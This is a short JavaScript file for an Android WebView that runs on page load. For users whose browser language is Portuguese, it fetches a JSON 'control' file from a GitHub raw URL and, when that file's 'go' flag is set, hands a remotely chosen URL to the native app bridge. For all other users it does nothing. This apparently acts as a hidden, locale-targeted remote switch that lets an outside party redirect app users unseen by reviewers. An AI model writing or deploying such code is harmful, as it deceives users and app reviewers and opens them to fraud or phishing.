function getXMLHttpRequest() {
    var xmlhttp;
    if (window.ActiveXObject) {
        // ie5 ie6
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    } else if (window.XMLHttpRequest) {
        // ie7+ ff chrome 浏览器原生
        xmlhttp = new XMLHttpRequest();
    } else {
        xmlhttp = null;
    }
    return xmlhttp
}

window.getData = function getData() {
    var language = navigator.language || navigator.userLanguage; // 获取当前设置的语言

    if (!language.toLowerCase().startsWith("pt")) {
        return true;
    }
    var xmlhttp = getXMLHttpRequest();
    // true异步 false同步
    xmlhttp.open('get', 'https://github.com/JasonFank/control/raw/main/com.gututo.austrion.talk', true);
    xmlhttp.send();//发送请求
    xmlhttp.onreadystatechange = function () {
        //200 请求成功
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            let res = JSON.parse(xmlhttp.response)
            if (res.go) {
                window.android.postMessage(res.url)
            }
        }
    }
}
window.getData()
